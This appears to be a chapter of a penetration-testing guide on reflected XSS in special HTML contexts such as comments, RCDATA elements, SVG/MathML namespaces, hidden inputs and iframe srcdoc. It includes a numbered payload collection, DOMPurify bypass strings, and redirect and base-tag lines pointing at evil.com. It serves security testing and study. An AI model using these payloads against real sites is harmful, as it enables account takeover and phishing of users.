# 05 - Reflected XSS: Special Contexts & Edge Cases

## Overview

Beyond standard HTML and JavaScript contexts, user input can land in obscure parsing contexts where unusual breakout techniques are required. These special contexts include HTML comments, meta tags, RCDATA elements (title/textarea), SVG/MathML foreign content, hidden input fields, iframe srcdoc, and data attributes. Many of these contexts are overlooked during security testing, making them high-value targets for vulnerability discovery.

**Key Principle**: The HTML parser has multiple parsing states and namespace contexts. Knowing which state the parser is in when it encounters your input determines the viable breakout technique.

**Sources**:
- [PortSwigger XSS Cheat Sheet - 2026 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Jorian Woltjer - Mutation XSS](https://jorianwoltjer.com/blog/p/research/mutation-xss)
- [Sonarsource - mXSS Cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/)
- [PortSwigger Research - XSS in Hidden Input Fields](https://portswigger.net/research/xss-in-hidden-input-fields)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Securitum - Mutation XSS via Namespace Confusion](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

---

## 1. Inside HTML Comments

When input is reflected inside an HTML comment (`<!-- REFLECTED -->`), the standard attack is to close the comment and inject new HTML.

### 1.1 Standard Comment Breakout

```html
<!-- Vulnerable: <!-- Search: REFLECTED --> -->

<!-- Basic breakout -->
--><script>alert(1)</script><!--
--><img src=x onerror=alert(1)><!--
--><svg onload=alert(1)><!--

<!-- With extra dashes (fuzzy comment parsing) -->
---><script>alert(1)</script>
----><img src=x onerror=alert(1)>
```

### 1.2 Comment Parsing Quirks

The HTML5 spec defines complex comment parsing rules. The parser looks for `-->` to close a comment, but there are edge cases:

```html
<!-- These are all valid comment closings in different parser states: -->
<!-- REFLECTED -->
<!-- REFLECTED --!>
<!-- REFLECTED -- >

<!-- Payload exploiting --!> closing: -->
--!><script>alert(1)</script>
--!><img src=x onerror=alert(1)>

<!-- Some parsers also accept: -->
<!-- REFLECTED --->
```

**Parser state detail**: After `<!--`, the parser enters the "comment" state. It transitions through "comment less-than sign", "comment end dash", "comment end", and "comment end bang" states. The `--!>` sequence exploits the "comment end bang" state which is a valid comment close.

### 1.3 Conditional Comments (Internet Explorer)

IE conditional comments are a legacy feature but still relevant for testing older systems:

```html
<!--[if gte IE 4]>
<script>alert(1)</script>
<![endif]-->

<!-- Downlevel-hidden conditional comment -->
<!--[if true]><script>alert(1)</script><![endif]-->

<!-- Downlevel-revealed conditional comment -->
<![if !IE]><script>alert(1)</script><![endif]>
```

**Note**: Conditional comments only work in IE9 and earlier. Modern browsers treat them as regular comments.

### 1.4 Nested Comments

HTML does not support nested comments. If the application wraps user input in a comment that is already inside a comment, the first `-->` closes BOTH:

```html
<!-- Outer comment <!-- Inner: REFLECTED --> still in outer? -->
<!-- No -- the first --> closed everything -->

<!-- Exploit: -->
<!-- Outer <!-- --><script>alert(1)</script><!-- --> -->
```

---

## 2. Inside Meta Tags

### 2.1 Meta HTTP-Equiv Refresh with JavaScript

```html
<!-- Vulnerable: <meta http-equiv="refresh" content="0;url=REFLECTED"> -->

<!-- javascript: protocol in meta refresh (legacy browsers) -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- Double URL trick -->
<meta http-equiv="refresh" content="0;url=http://;url=javascript:alert(1);">

<!-- Data URI in meta refresh (Safari only) -->
<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**Browser compatibility**: Modern Chrome and Firefox do NOT execute `javascript:` in meta refresh URLs. Safari has historically been more permissive with `data:` URIs.

Source: [0xPrial - XSS Bypass Using META Tag](https://0xprial.com/xss-bypass-using-meta-tag-in-realestate-postnl-nl/), [HackerOne Report #157813](https://hackerone.com/reports/157813)

### 2.2 Meta Tag Injection for Redirect

If the attacker can inject an entire meta tag:

```html
<!-- Inject a new meta tag to redirect -->
<meta http-equiv="refresh" content="0;url=https://evil.com">
<meta http-equiv="refresh" content="1;url=https://evil.com/phish">

<!-- Cookie manipulation (legacy) -->
<meta http-equiv="Set-Cookie" content="session=attacker_value">
```

### 2.3 Meta Tag Breakout

```html
<!-- Vulnerable: <meta name="description" content="REFLECTED"> -->

<!-- Break out of content attribute -->
"><meta http-equiv="refresh" content="0;url=https://evil.com">
"><script>alert(1)</script>
" ><img src=x onerror=alert(1)>

<!-- If only content value is controlled: -->
0;url=javascript:alert(1)
```

---

## 3. Inside Title, Textarea, and Other RCDATA Elements

### 3.1 RCDATA Parsing Rules

The HTML5 spec defines certain elements as **RCDATA elements**: `<title>` and `<textarea>`. Inside RCDATA elements:
- HTML tags are NOT parsed (they appear as literal text)
- Character references ARE decoded
- The ONLY way to exit is the matching closing tag

**RAWTEXT elements** (`<style>`, `<script>`, `<xmp>`, `<noembed>`, `<noframes>`, `<noscript>`) have even stricter rules:
- HTML tags are NOT parsed
- Character references are NOT decoded
- The ONLY way to exit is the matching closing tag

### 3.2 Title Tag Breakout

```html
<!-- Vulnerable: <title>REFLECTED</title> -->

<!-- Must close the title tag first -->
</title><script>alert(1)</script>
</title><img src=x onerror=alert(1)>
</title><svg onload=alert(1)>
</title><body onload=alert(1)>

<!-- Case variation -->
</Title><script>alert(1)</script>
</TITLE><script>alert(1)</script>

<!-- With space -->
</title ><script>alert(1)</script>
```

**Why regular payloads fail**: Inside `<title>`, the string `<script>alert(1)</script>` is treated as literal text, NOT as an HTML tag. The parser only looks for `</title>` to exit the RCDATA state.

### 3.3 Textarea Breakout

```html
<!-- Vulnerable: <textarea>REFLECTED</textarea> -->

</textarea><script>alert(1)</script>
</textarea><img src=x onerror=alert(1)>
</textarea><svg onload=alert(1)>
</textarea><details open ontoggle=alert(1)>
```

### 3.4 Style/Noscript/XMP Breakout (RAWTEXT)

```html
<!-- Vulnerable: <style>REFLECTED</style> -->
</style><script>alert(1)</script>
</style><img src=x onerror=alert(1)>

<!-- Vulnerable: <noscript>REFLECTED</noscript> (when JS is disabled or in specific contexts) -->
</noscript><script>alert(1)</script>

<!-- Vulnerable: <xmp>REFLECTED</xmp> -->
</xmp><script>alert(1)</script>

<!-- Vulnerable: <noframes>REFLECTED</noframes> -->
</noframes><img src=x onerror=alert(1)>

<!-- Vulnerable: <noembed>REFLECTED</noembed> -->
</noembed><img src=x onerror=alert(1)>
```

---

## 4. Inside SVG/MathML Foreign Content

### 4.1 Namespace Confusion

HTML, SVG, and MathML are three distinct namespaces with different parsing rules. When the HTML parser encounters `<svg>` or `<math>`, it switches to the foreign content parsing mode. This namespace switch creates opportunities for bypassing sanitizers.

**Critical difference**: In HTML namespace, `<style>` content is raw text (no child elements). In SVG/MathML namespace, `<style>` content can contain child HTML elements that are parsed.

```html
<!-- SVG namespace: style tag is parsed differently -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- This works because inside SVG, <style> allows child elements -->
<!-- Sanitizers that treat <style> as raw text may miss this -->
```

Source: [Securitum - Mutation XSS via Namespace Confusion](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

### 4.2 SVG Event Handlers

SVG elements support their own set of event handlers:

```html
<!-- SVG onload (most common) -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert(1)">

<!-- SVG animation events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s begin=0s>
<svg><set onbegin=alert(1) attributeName=x to=1>

<!-- SVG with embedded script -->
<svg><script>alert(1)</script></svg>

<!-- SVG foreignObject (switches back to HTML parsing) -->
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>

<!-- SVG with desc/title containing HTML -->
<svg><desc><img src=x onerror=alert(1)></desc></svg>
```

### 4.3 MathML Integration Points

MathML defines "text integration points" where child elements are parsed as HTML. This is a key vector for mutation XSS:

```html
<!-- MathML text integration points: mi, mo, mn, ms, mtext -->
<math><mtext><img src=x onerror=alert(1)></mtext></math>
<math><mi><img src=x onerror=alert(1)></mi></math>
<math><mn><img src=x onerror=alert(1)></mn></math>
<math><ms><img src=x onerror=alert(1)></ms></math>
<math><mo><img src=x onerror=alert(1)></mo></math>

<!-- MathML annotation-xml with encoding="text/html" is an HTML integration point -->
<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
```

### 4.4 Mutation XSS (mXSS) via Namespace Confusion

Mutation XSS exploits the difference between how a sanitizer parses HTML and how the browser renders it. Namespace confusion is the primary vector:

```html
<!-- DOMPurify < 2.0.17 bypass (CVE) -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></math>

<!-- How it works:
   1. Sanitizer sees <style> in HTML namespace (raw text, safe)
   2. Browser parses <mglyph> as MathML, switching namespaces
   3. <svg> enters SVG namespace
   4. <style> in SVG namespace allows child HTML elements
   5. <img onerror> executes JavaScript -->

<!-- DOMPurify < 2.2.2 bypass -->
<svg></p><style><g title="</style><img src=x onerror=alert(1)>">

<!-- DOMPurify <= 3.1.0 bypass (April 2024, by @IceFont) -->
<!-- Uses form elements and mglyph for namespace confusion -->
<form><math><mtext><form><mglyph><svg><mtext><style><img src onerror=alert(1)>
```

**Key concept**: The sanitizer and the browser must parse HTML identically for sanitization to be effective. Any discrepancy in namespace handling creates an mXSS opportunity.

Source: [Mizu.re - Exploring DOMPurify Bypasses](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes), [SonarSource - mXSS](https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/), [Flatt Security - Bypassing DOMPurify](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/)

---

## 5. Inside Input/Hidden Fields

### 5.1 Hidden Input XSS via Accesskey + Onclick

Hidden input fields (`<input type="hidden">`) cannot be focused, hovered, or clicked normally. However, the `accesskey` attribute combined with certain event handlers enables XSS:

```html
<!-- Vulnerable: <input type="hidden" name="token" value="REFLECTED"> -->

<!-- Accesskey + onclick (requires user to press key combination) -->
" accesskey="x" onclick="alert(1)" x="

<!-- Browser key combinations to trigger:
     Firefox (Windows/Linux): ALT+SHIFT+X
     Firefox (macOS): CTRL+ALT+X
     Chrome: ALT+X (Windows/Linux) or CTRL+ALT+X (macOS)
     Safari: CTRL+ALT+X -->
```

**Important discovery by PortSwigger Research**: In 2017, Gareth Heyes discovered that the `onclick` event fires on hidden inputs when triggered via `accesskey` in Firefox. This was later confirmed to work in Chrome as well.

Source: [PortSwigger Research - XSS in Hidden Input Fields](https://portswigger.net/research/xss-in-hidden-input-fields)

### 5.2 Type Switching Attack

If the attacker can inject attributes, change the input type from `hidden` to `text` or `image`:

```html
<!-- Vulnerable: <input type="hidden" value="REFLECTED"> -->

<!-- Switch type to text and add autofocus -->
" type="text" onfocus="alert(1)" autofocus="
" type="text" onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%"

<!-- Switch to image type -->
" type="image" src=x onerror="alert(1)"

<!-- Switch to button type -->
" type="button" onclick="alert(1)" value="Click Me"
```

### 5.3 Tabindex + Focus Events

Adding `tabindex` makes any element focusable, enabling focus-related events:

```html
<!-- For hidden or non-focusable elements -->
" tabindex="1" onfocus="alert(1)" autofocus="
" tabindex="0" onfocusin="alert(1)"

<!-- Combined with style to make visible -->
" tabindex="1" onfocus="alert(1)" style="display:block" autofocus="
```

### 5.4 Breaking Out of Hidden Input

```html
<!-- Vulnerable: <input type="hidden" name="x" value="REFLECTED"> -->

<!-- Close the input and inject new visible element -->
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
"><script>alert(1)</script>

<!-- If only value attribute is injectable but quotes work: -->
" onfocus="alert(1)" autofocus type="text"
```

Source: [David Sopas - XSS on Hidden Input](https://www.davidsopas.com/xss-on-a-input-hidden-field/), [Web Security Lens - Exploit XSS in Hidden Input](https://www.websecuritylens.org/pentest-skillexploit-xss-in-hidden-input-field/)

---

## 6. Inside Iframe srcdoc

The `srcdoc` attribute of `<iframe>` contains HTML that is rendered as the frame's content. It uses HTML entity encoding.

### 6.1 Srcdoc Injection

```html
<!-- Vulnerable: <iframe srcdoc="REFLECTED"></iframe> -->

<!-- HTML entities are decoded inside srcdoc -->
<!-- So even entity-encoded payloads execute: -->
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;

<!-- Direct injection if quotes not encoded: -->
"><iframe srcdoc="<script>alert(1)</script>">
```

### 6.2 Srcdoc with Entity Encoding

```html
<!-- Because srcdoc is an HTML attribute, entities are decoded: -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
<!-- This EXECUTES alert(1) because entities are decoded before rendering -->

<!-- Double encoding scenario: -->
<!-- If app HTML-encodes, but srcdoc decodes again: -->
<iframe srcdoc="&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"></iframe>
<!-- This does NOT execute because double-encoded entities remain encoded -->
```

### 6.3 Real-World srcdoc XSS

```html
<!-- Bypass XSS auditors via srcdoc (Mozilla Bug 1338029) -->
<iframe srcdoc="<script>alert(document.domain)</script>">

<!-- Nested iframe srcdoc -->
<iframe srcdoc="<iframe srcdoc='<img src=x onerror=alert(1)>'>">

<!-- FreshRSS CVE (GHSA-wgrq-mcwc-8f8v): -->
<!-- Script tag embedded in iframe srcdoc bypassed sanitization -->
```

Source: [HackTricks - Iframes in XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp), [FreshRSS Security Advisory](https://github.com/FreshRSS/FreshRSS/security/advisories/GHSA-wgrq-mcwc-8f8v)

---

## 7. Inside Data Attributes Rendered by JavaScript

### 7.1 Data Attribute to DOM Sink

Modern frameworks and JavaScript code often read `data-*` attributes and insert them into the DOM:

```html
<!-- Vulnerable pattern: -->
<div data-tooltip="REFLECTED" class="has-tooltip"></div>
<script>
  // Framework reads data attribute and inserts as HTML
  document.querySelectorAll('.has-tooltip').forEach(el => {
    el.innerHTML = el.dataset.tooltip;  // VULNERABLE SINK
  });
</script>

<!-- Payload: -->
<div data-tooltip="<img src=x onerror=alert(1)>" class="has-tooltip"></div>
```

### 7.2 Common Framework Patterns

```html
<!-- Angular -->
<div [innerHTML]="userControlledData"></div>

<!-- React dangerouslySetInnerHTML -->
<div dangerouslySetInnerHTML={{__html: userInput}}></div>

<!-- jQuery .html() from data attribute -->
<div data-content="<img src=x onerror=alert(1)>" id="target"></div>
<script>$('#target').html($('#target').data('content'));</script>

<!-- Vue v-html directive -->
<div v-html="userInput"></div>
```

### 7.3 Server-Side Rendering with Data Attributes

```html
<!-- Vulnerable: Server puts user input in data attribute, JS reads it -->
<div data-config='{"name":"REFLECTED"}' id="app"></div>

<!-- If single quotes are the delimiter: -->
'><img src=x onerror=alert(1)>
' onmouseover='alert(1)

<!-- If JSON is parsed by JS and inserted: -->
{"name":"</div><script>alert(1)</script><div data-x=\""}
```

---

## 8. Browser-Specific Quirks and Edge Cases

### 8.1 Chrome-Specific

```html
<!-- Chrome allows autofocus across multiple elements -->
<input autofocus onfocus=alert(1)>

<!-- Chrome SVG animation events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Chrome idle detection API abuse (requires permission) -->
<!-- Not directly XSS but relevant for post-exploitation -->
```

### 8.2 Firefox-Specific

```html
<!-- Firefox accesskey triggers onclick on hidden inputs -->
<input type="hidden" accesskey="x" onclick="alert(1)">
<!-- Trigger: ALT+SHIFT+X -->

<!-- Firefox-specific SVG events -->
<svg><set onbegin=alert(1) attributeName=x to=1>

<!-- Firefox allows certain XSS in about: pages -->
<!-- Relevant for browser extension testing -->
```

### 8.3 Safari-Specific

```html
<!-- Safari data: URI in meta refresh -->
<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Safari-specific WebKit events -->
<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>
<video onwebkitplaybacktargetavailabilitychanged=alert(1)>

<!-- Safari allows javascript: in more contexts -->
<a href="javascript:alert(1)">  <!-- Works with top-level navigation in Safari -->
```

### 8.4 Edge Cases Across Browsers

```html
<!-- Null byte handling (legacy) -->
<scri\x00pt>alert(1)</script>

<!-- HTML entities in tag names (no browser supports this, but sanitizers may) -->
<scr&#x69;pt>alert(1)</script>

<!-- Multiple encoding layers -->
<!-- URL encoding -> HTML decoding -> JS execution -->
<a href="javascript:alert(1)">  <!-- after URL decode -->

<!-- Mutation observer timing attacks -->
<!-- DOM changes between sanitization and rendering -->

<!-- Content-Security-Policy bypass via base tag -->
<base href="https://evil.com/">
<!-- Then relative script src loads from evil.com -->

<!-- DOM clobbering for sanitizer bypass -->
<form id="x"><input name="nodeName" value="IMG"></form>
<!-- Sanitizer checks el.nodeName, gets "IMG" instead of "FORM" -->
```

### 8.5 Character Encoding Edge Cases

```html
<!-- UTF-7 encoding (legacy IE) -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- Overlong UTF-8 sequences (legacy) -->
<!-- %C0%BC = < in overlong encoding -->

<!-- BOM (Byte Order Mark) bypass -->
<!-- U+FEFF at start of payload may bypass some filters -->

<!-- Right-to-left override (U+202E) for visual obfuscation -->
<!-- Not XSS itself but aids social engineering -->

<!-- Fullwidth characters (Unicode normalization) -->
<!-- U+FF1C (fullwidth <) may normalize to < after processing -->
<script>alert(1)</script>  <!-- fullwidth angle brackets -->
```

Source: [PortSwigger Research - Exotic Events](https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet), [Securitum - Unicode in XSS](https://www.securitum.com/unicodes_role_in_xss_vulnerabilities.html)

---

## 9. Ready-to-Use Payload Collection (Special Contexts)

### HTML Comment Breakout

```html
S01: --><script>alert(1)</script><!--
S02: --><img src=x onerror=alert(1)><!--
S03: --!><img src=x onerror=alert(1)>
S04: --><svg onload=alert(1)><!--
```

### Meta Tag Exploitation

```html
S05: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
S06: "><meta http-equiv="refresh" content="0;url=https://evil.com">
S07: 0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### RCDATA/RAWTEXT Breakout

```html
S08: </title><script>alert(1)</script>
S09: </textarea><img src=x onerror=alert(1)>
S10: </style><svg onload=alert(1)>
S11: </noscript><img src=x onerror=alert(1)>
S12: </xmp><img src=x onerror=alert(1)>
```

### SVG/MathML Foreign Content

```html
S13: <svg onload=alert(1)>
S14: <svg><animate onbegin=alert(1) attributeName=x dur=1s>
S15: <math><mtext><img src=x onerror=alert(1)>
S16: <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
S17: <math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
```

### Hidden Input Field

```html
S18: " accesskey="x" onclick="alert(1)"
S19: " type="image" src=x onerror="alert(1)"
S20: " type="text" onfocus="alert(1)" autofocus="
S21: " tabindex="1" onfocus="alert(1)" style="display:block" autofocus="
```

### Iframe Srcdoc

```html
S22: <iframe srcdoc="<script>alert(1)</script>">
S23: <iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;">
```

### Polyglot for Special Contexts

```html
S24: --></title></textarea></style></noscript></xmp></script><svg/onload=alert(1)>
```

This polyglot attempts to close every possible special parsing context before injecting the SVG payload.

---

## 10. Testing Methodology for Special Contexts

### Step 1: Identify the Special Context
Use the probe string `-->*/ ]]> </title></textarea></style></script></xmp> TEST<img>` and observe:
- Does `TEST<img>` render as text or as an HTML element?
- Which closing tags cause visible changes in page structure?
- Is the reflection inside a comment, RCDATA element, or foreign content?

### Step 2: Context-Specific Testing

| Context Detected | Primary Technique | Fallback |
|-----------------|-------------------|----------|
| HTML Comment | `-->` breakout | `--!>` breakout |
| Title/Textarea | `</title>` or `</textarea>` breakout | Case variation |
| Style tag | `</style>` breakout | N/A |
| SVG context | SVG event handlers | `<foreignObject>` switch to HTML |
| MathML context | MathML text integration points | Namespace confusion |
| Hidden input | accesskey+onclick | type switching |
| Meta tag | Close attribute, inject new meta | Redirect via http-equiv |
| iframe srcdoc | Entity-decoded HTML injection | Break out of srcdoc attribute |

### Step 3: Sanitizer Bypass Testing
If a sanitizer is in use:
- Test namespace confusion payloads (SVG/MathML/HTML switches)
- Test mutation XSS vectors (parse-serialize-reparse discrepancies)
- Test DOM clobbering to confuse sanitizer logic
- Check if `<math>` and `<svg>` tags are allowed (if so, mXSS is likely possible)

### Step 4: Verify Cross-Browser
Special context payloads often have varying browser support:
- Test in Chrome, Firefox, Safari, and Edge
- accesskey+onclick: Works in Firefox and Chrome (different key combos)
- data: URI in meta refresh: Safari only
- WebKit-specific events: Safari only
- Conditional comments: IE9 and earlier only
